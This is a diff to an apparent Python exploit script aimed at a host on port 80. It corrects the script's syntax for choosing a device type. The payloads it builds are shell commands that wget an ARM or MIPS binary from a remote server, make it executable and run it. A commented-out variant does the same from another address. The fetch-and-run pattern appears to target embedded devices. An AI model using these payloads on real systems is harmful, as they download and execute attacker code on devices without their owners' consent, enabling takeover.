@@ -15,17 +15,17 @@ if(len(sys.argv) != 3):
 	sys.exit(0)
 
 host = sys.argv[1]
-deviceT = sys.argv[2]
+deviceT = int(sys.argv[2])
 port = 80
 
 #cmd = 'wget http://192.168.0.99:8080/mips; chmod +x mips; ./mips; rm -rf mips;'
 
-if(deviceT = 1):
+if deviceT == 1:
 	data = {
 		'cmd':'wget -P /tmp http://10.0.2.15:8000/arm; chmod +x /tmp/arm; qemu-arm-static /tmp/arm'
 	}
 
-else if (deviceT=2):
+elif deviceT == 2:
 	data = {
 		'cmd':'wget -P /tmp http://10.0.2.15:8000/mips; chmod +x /tmp/mips; qemu-mips-static /tmp/mips'
 	}
